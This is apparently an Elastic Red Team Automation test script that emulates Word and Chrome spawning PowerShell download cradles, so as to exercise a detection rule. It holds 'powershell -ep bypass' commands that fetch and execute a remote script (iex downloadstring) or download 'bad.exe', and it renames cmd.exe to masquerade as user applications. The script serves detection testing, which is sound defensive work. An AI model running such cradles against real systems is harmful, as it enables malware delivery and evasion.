# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Suspicious PowerShell Download
# RTA: suspicious_powershell_download.py
# signal.rule.name: Suspicious MS Office Child Process
# ATT&CK: T1086
# Description: PowerShell using DownloadString or DownloadFile in suspicious context

import os
import time

from . import common


@common.requires_os(common.WINDOWS)
def main():
    cmd_path = "c:\\windows\\system32\\cmd.exe"
    server, ip, port = common.serve_web()
    url = f'http://{ip}:{port}/bad.ps1'

    cmds = [
        f"powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{url}')",
        f"powershell -ep bypass -c (new-object net.webclient).downloadfile('{url}', 'bad.exe')",
    ]


    # emulate word and chrome
    for user_app in ["winword.exe", "chrome.exe"]:
        common.log(f"Emulating {user_app}")
        user_app_path = os.path.abspath(user_app)
        common.copy_file(cmd_path, user_app_path)

        for cmd in cmds:
            common.execute([user_app_path, "/c", cmd])
            time.sleep(2)

        # cleanup
        common.remove_file(user_app_path)


if __name__ == "__main__":
    exit(main())
